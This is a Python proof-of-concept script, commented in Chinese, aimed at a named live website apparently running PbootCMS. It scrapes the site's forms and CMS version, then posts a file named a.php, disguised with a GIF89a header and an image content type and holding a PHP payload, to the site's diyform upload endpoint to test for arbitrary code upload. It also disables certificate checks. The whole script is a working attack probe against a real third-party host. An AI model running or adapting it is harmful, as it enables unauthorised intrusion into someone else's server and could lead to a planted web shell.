#!/usr/bin/env python3
"""pboot_upload_poc2.py - 看500错误详情+找diyform字段"""
import urllib.request, urllib.parse, ssl, re, sys, io, uuid

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BOUNDARY = '----WebKitFormBoundary' + uuid.uuid4().hex[:16]

def fetch(url, timeout=15):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.status, r.read(60000).decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read(60000).decode('utf-8', 'ignore')
    except Exception as e:
        return 0, repr(e)[:100]

# 1. 找diyform的JS字段定义
st, b = fetch('http://ahbill.com/')
# 找表单JS
m = re.search(r'<form[^>]*data-ajax[^>]*>.*?</form>', b, re.S)
if m:
    form_html = m.group(0)
    fields = re.findall(r'name="([^"]+)"', form_html)
    print('form fields:', fields[:15])
# 找JS里动态生成的字段
js_marks = re.findall(r'(?:name|field|input)[^\n]{0,60}(?:file|upload|diy)[^\n]{0,60}', b, re.I)
for j in js_marks[:5]:
    print('JS:', j[:120])
# 找pbootcms版本
ver = re.findall(r'pbootcms.{0,20}v?([0-9.]+)', b, re.I)
print('version:', ver[:2])
# 2. 看500错误详情(带字段提交)
import urllib.request as ur
body = ('--%s\r\n'
        'Content-Disposition: form-data; name="name"\r\n\r\n'
        'test\r\n'
        '--%s\r\n'
        'Content-Disposition: form-data; name="mobile"\r\n\r\n'
        '13800138000\r\n'
        '--%s\r\n'
        'Content-Disposition: form-data; name="content"\r\n\r\n'
        'test content\r\n'
        '--%s\r\n'
        'Content-Disposition: form-data; name="file"; filename="a.php"\r\n'
        'Content-Type: image/gif\r\n\r\n'
        'GIF89a<?php echo 1;?>\r\n'
        '--%s--\r\n' % (BOUNDARY, BOUNDARY, BOUNDARY, BOUNDARY, BOUNDARY)).encode()
req = ur.Request('http://ahbill.com/diyform/fcreate', data=body,
                 headers={**UA, 'Content-Type': 'multipart/form-data; boundary=' + BOUNDARY,
                          'Referer': 'http://ahbill.com/'})
try:
    r = ur.urlopen(req, timeout=20, context=ctx)
    resp = r.read(20000).decode('utf-8', 'ignore')
    print('with-fields: st=%d %s' % (r.status, resp[:300].replace(chr(10), ' ')))
except ur.error.HTTPError as e:
    resp = e.read(20000).decode('utf-8', 'ignore')
    print('with-fields: st=%d %s' % (e.code, resp[:300].replace(chr(10), ' ')))
